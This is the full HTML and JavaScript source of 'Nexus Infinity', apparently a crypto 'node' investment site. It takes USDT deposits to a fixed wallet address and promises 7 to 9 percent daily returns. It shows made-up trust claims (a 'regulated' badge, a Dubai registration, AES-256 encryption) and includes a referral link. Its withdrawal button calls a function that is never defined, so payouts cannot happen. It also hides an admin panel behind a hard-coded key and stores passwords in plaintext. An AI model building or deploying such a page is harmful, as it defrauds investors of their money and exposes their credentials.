<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #080808; --glass: rgba(18, 18, 18, 0.85); }
        body { background-color: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; }

        /* Premium UI */
        .neon-text-red { color: var(--neon-red); text-shadow: 0 0 10px rgba(255, 0, 60, 0.5); }
        .glass-panel { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 32px; }
        .apex-node { border: 1px solid var(--neon-red) !important; background: linear-gradient(145deg, rgba(255,0,60,0.1), transparent) !important; }
        
        /* Buttons & Inputs */
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; transition: 0.3s; box-shadow: 0 8px 25px rgba(255, 0, 60, 0.3); }
        .btn-master:active { transform: scale(0.96); }
        .input-dark { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 18px; padding: 16px; color: white; outline: none; width: 100%; }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: var(--neon-red); border-radius: 10px; }

        .nav-item { color: #555; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; }
        .nav-item.active { color: var(--neon-red); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2rem] flex items-center justify-center text-5xl font-black shadow-[0_0_50px_rgba(255,0,60,0.4)] animate-pulse">N</div>
        <p class="mt-8 text-xs font-light tracking-[0.5em] text-white opacity-50 uppercase">Securing Global Assets</p>
    </div>

    <div id="auth-section" class="min-h-screen p-8 flex flex-col items-center justify-center hidden">
        <div class="w-full max-w-sm space-y-8">
            <div id="logo-tap" class="text-center">
                <h1 style="font-family: 'Syncopate'" class="text-2xl font-bold tracking-tighter">NEXUS<span class="neon-text-red">INFINITY</span></h1>
                <p class="text-[8px] text-zinc-500 uppercase tracking-widest mt-2">Institutional Grade Node Network</p>
            </div>

            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Account Identifier" class="input-dark">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-master w-full">Access Terminal</button>
                <div class="flex justify-between text-[9px] font-bold text-zinc-500 uppercase px-2">
                    <span onclick="toggleAuth(true)" class="cursor-pointer hover:text-white">New Identity</span>
                    <span onclick="alert('Contact Institutional Support.')" class="cursor-pointer">Forgot Key?</span>
                </div>
            </div>

            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Choose Username" class="input-dark">
                <input type="password" id="s-pass" placeholder="Set Password" class="input-dark">
                <button onclick="handleSignup()" class="btn-master w-full">Establish Node</button>
                <p onclick="toggleAuth(false)" class="text-center text-[9px] font-bold text-zinc-500 uppercase cursor-pointer">Return to Login</p>
            </div>

            <div class="pt-10 border-t border-white/5 grid grid-cols-3 gap-4 opacity-30 grayscale">
                <div class="text-center"><i class="fa-solid fa-shield-halved text-xl"></i><p class="text-[6px] mt-1">AES-256</p></div>
                <div class="text-center"><i class="fa-solid fa-earth-americas text-xl"></i><p class="text-[6px] mt-1">GLOBAL</p></div>
                <div class="text-center"><i class="fa-solid fa-building-columns text-xl"></i><p class="text-[6px] mt-1">REGULATED</p></div>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-28">
        <nav class="p-6 sticky top-0 bg-black/60 backdrop-blur-xl border-b border-white/5 flex justify-between items-center z-[500]">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                <div>
                    <p class="text-[7px] font-black text-zinc-500 uppercase tracking-tighter">Terminal ID</p>
                    <p id="nav-user" class="text-sm font-black italic">...</p>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full bg-zinc-900 border border-white/5 flex items-center justify-center"><i class="fa-solid fa-power-off text-xs text-zinc-500"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 to-black relative overflow-hidden border-t border-white/10">
                <div class="absolute -top-10 -right-10 w-40 h-40 bg-[#ff003c] opacity-5 blur-[100px]"></div>
                <p class="text-[10px] font-bold text-zinc-400 uppercase tracking-widest mb-2">Available Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between items-end">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Live Yield Status</p>
                        <p class="text-xs font-black text-green-500 flex items-center gap-2"><span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span> NODE ACTIVE</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[8px] font-black text-zinc-500 uppercase">Aggregated Profit</p>
                        <p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p>
                    </div>
                </div>
            </div>

            <h3 class="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em]">Synchronized Deployments</h3>
            <div id="active-nodes-list" class="space-y-4">
                <div class="p-8 text-center glass-panel border-dashed border-white/10">
                    <p class="text-[10px] text-zinc-600 italic">Initiate node deployment to begin yield generation...</p>
                </div>
            </div>
        </div>

        <div id="page-nodes" class="p-6 space-y-6 hidden">
            <div class="flex justify-between items-center">
                <h3 class="heading-font text-lg font-black italic">PROTOCOL MARKET</h3>
                <span class="text-[8px] bg-zinc-900 px-3 py-1 rounded-full text-zinc-400 border border-white/5">V4.2 GLOBAL</span>
            </div>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-finance" class="p-6 space-y-6 hidden">
            <h3 class="heading-font text-lg font-black italic">CAPITAL GATEWAY</h3>
            <div class="glass-panel p-6 space-y-5">
                <div class="flex justify-between items-center mb-2">
                    <p class="text-[10px] font-black text-zinc-400 uppercase">Institutional Deposit</p>
                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-4">
                </div>
                <div class="bg-black/50 p-4 rounded-2xl border border-white/5 relative overflow-hidden">
                    <p class="text-[7px] text-zinc-500 mb-1">NETWORK: USDT (TRC20)</p>
                    <p class="text-[10px] font-bold text-[#ff003c] break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Injection Amount ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Blockchain TID / Hash" class="input-dark">
                <div class="relative">
                    <input type="file" id="dep-proof" class="absolute inset-0 opacity-0 cursor-pointer">
                    <div class="input-dark text-center text-xs text-zinc-500 border-dashed"><i class="fa-solid fa-cloud-arrow-up mr-2"></i>Upload Receipt</div>
                </div>
                <button onclick="submitDep()" class="btn-master w-full">Authorize Deposit</button>
            </div>

            <div class="glass-panel p-6 space-y-4">
                <p class="text-[10px] font-black text-zinc-400 uppercase">Capital Withdrawal</p>
                <input type="text" id="w-addr" placeholder="Destination Wallet" class="input-dark">
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-dark">
                <button onclick="submitWith()" class="btn-master w-full !bg-zinc-800 shadow-none">Initialize Payout</button>
            </div>
        </div>

        <div id="page-menu" class="p-6 space-y-6 hidden">
            <h3 class="heading-font text-lg font-black italic">CORPORATE INFO</h3>
            <div class="space-y-3">
                <div onclick="showInfo('About')" class="glass-panel p-5 text-[10px] font-bold uppercase flex justify-between items-center"><span><i class="fa-solid fa-building mr-3 text-[#ff003c]"></i>Company Profile</span><i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
                <div onclick="showInfo('Legal')" class="glass-panel p-5 text-[10px] font-bold uppercase flex justify-between items-center"><span><i class="fa-solid fa-file-contract mr-3 text-[#ff003c]"></i>Privacy & Legal</span><i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
                <div onclick="showInfo('FAQ')" class="glass-panel p-5 text-[10px] font-bold uppercase flex justify-between items-center"><span><i class="fa-solid fa-circle-question mr-3 text-[#ff003c]"></i>Support & FAQ</span><i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
            </div>
            
            <div class="glass-panel p-6 mt-6">
                <p class="text-[9px] font-black text-zinc-500 uppercase mb-3">Institutional Referral ID</p>
                <div class="flex gap-2">
                    <input id="ref-link" readonly class="input-dark !py-3 !text-[10px] !bg-zinc-900 border-none">
                    <button onclick="copyRef()" class="bg-white text-black px-4 rounded-xl text-[10px] font-black">COPY</button>
                </div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-2xl border-t border-white/5 p-5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-gauge-high block text-xl mb-1"></i>CORE</div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-layer-group block text-xl mb-1"></i>NODES</div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-vault block text-xl mb-1"></i>VAULT</div>
            <div onclick="switchPage('menu')" class="nav-item"><i class="fa-solid fa-shield block text-xl mb-1"></i>TRUST</div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#080808] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black italic text-[#ff003c]">MASTER OVERRIDE</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div id="admin-dep-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // 10 Standard Nodes + 5 Apex Nodes
        const nodesData = [
            ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `Nexus S-0${i+1}`, price: (i+1)*50, daily: ((i+1)*3.5).toFixed(2), total: ((i+1)*3.5*30).toFixed(2), days: 30 })),
            ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex', title: `Apex Alpha-0${i+1}`, price: (i+1)*500, daily: ((i+1)*45).toFixed(2), total: ((i+1)*45*45).toFixed(2), days: 45 }))
        ];

        window.onload = () => {
            renderNodes();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesData.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.type === 'Apex' ? 'apex-node' : ''}">
                    <div>
                        <p class="text-[7px] font-black ${n.type === 'Apex' ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type} Tier</p>
                        <h4 class="text-xl font-extrabold italic">${n.title}</h4>
                        <div class="flex gap-4 mt-2">
                            <div><p class="text-[6px] text-zinc-500 uppercase">Daily</p><p class="text-[10px] font-black text-green-500">$${n.daily}</p></div>
                            <div><p class="text-[6px] text-zinc-500 uppercase">Total</p><p class="text-[10px] font-black text-[#ff00ff]">$${n.total}</p></div>
                            <div><p class="text-[6px] text-zinc-500 uppercase">Term</p><p class="text-[10px] font-black">${n.days}D</p></div>
                        </div>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black mb-2">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="bg-white text-black px-6 py-2 rounded-xl text-[9px] font-black uppercase">Deploy</button>
                    </div>
                </div>
            `).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodesData.find(n => n.id === id);
            const snap = await get(ref(db, `users/${user}`));
            const bal = snap.val().balance || 0;
            if(bal < node.price) return alert("Capital Reserves Insufficient.");
            
            await update(ref(db, `users/${user}`), { balance: bal - node.price });
            await push(ref(db, `users/${user}/activeNodes`), { ...node, startTime: Date.now(), expiry: Date.now() + (node.days * 86400000) });
            alert("Node Protocol Synchronized.");
            switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('ref-link').value = window.location.origin + "/?ref=" + uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val();
                if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                if(data.activeNodes) {
                    document.getElementById('active-nodes-list').innerHTML = Object.values(data.activeNodes).map(n => {
                        const timeLeft = Math.max(0, n.expiry - Date.now());
                        const hours = Math.floor(timeLeft / 3600000);
                        return `
                        <div class="glass-panel p-5 border-l-4 border-[#ff003c]">
                            <div class="flex justify-between items-center mb-4">
                                <p class="text-[9px] font-black uppercase text-white">${n.title}</p>
                                <span class="text-[8px] bg-green-500/10 text-green-500 px-2 py-1 rounded">DEPLOAYED</span>
                            </div>
                            <div class="flex justify-between">
                                <div><p class="text-[6px] text-zinc-500">NEXT YIELD</p><p class="text-xs font-black italic text-[#ff003c] tabular-nums">${hours}H Remaining</p></div>
                                <div class="text-right"><p class="text-[6px] text-zinc-500">DAILY ROI</p><p class="text-xs font-black italic text-white">$${n.daily}</p></div>
                            </div>
                        </div>`;
                    }).join('');
                }
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!amt || !tid || !file) return alert("All Protocol Data Required.");
            const reader = new FileReader(); reader.readAsDataURL(file);
            reader.onload = async () => {
                const entry = { user, amount: amt, tid, proof: reader.result, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit' };
                const hRef = push(ref(db, `users/${user}/history`));
                await set(hRef, entry);
                await set(ref(db, `admin/deposits/${hRef.key}`), entry);
                alert("Protocol Logged. Awaiting Verification.");
            };
        };

        window.showInfo = (type) => {
            if(type === 'About') alert("Nexus Infinity Global Ltd.\nReg: UAE-7729-IF\nHeadquarters: Dubai, Silicon Oasis.\nWorldwide Nodes: 1.2M+");
            if(type === 'Legal') alert("Privacy Policy:\nAll data is AES-256 Encrypted.\nWithdrawals are processed within 2-24 hours.\nNodes are non-refundable after deployment.");
            if(type === 'FAQ') alert("Min Deposit: $10\nMin Withdraw: $5\nSupport: 24/7 Global Desk.");
        };

        // ADMIN OVERRIDE LOGIC
        let taps = 0;
        document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            taps++;
            if(taps === 4) {
                if(prompt("Security Key:") === "coin786") document.getElementById('admin-panel').classList.remove('hidden');
                taps = 0;
            }
            setTimeout(()=>taps=0, 2000);
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Fields Empty.");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Established."); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Authentication Failed.");
        };

        window.switchPage = (p) => {
            ['home', 'nodes', 'finance', 'menu'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { document.getElementById('ref-link').select(); document.execCommand('copy'); alert("Referral Link Copied."); };
    </script>
</body>
</html>
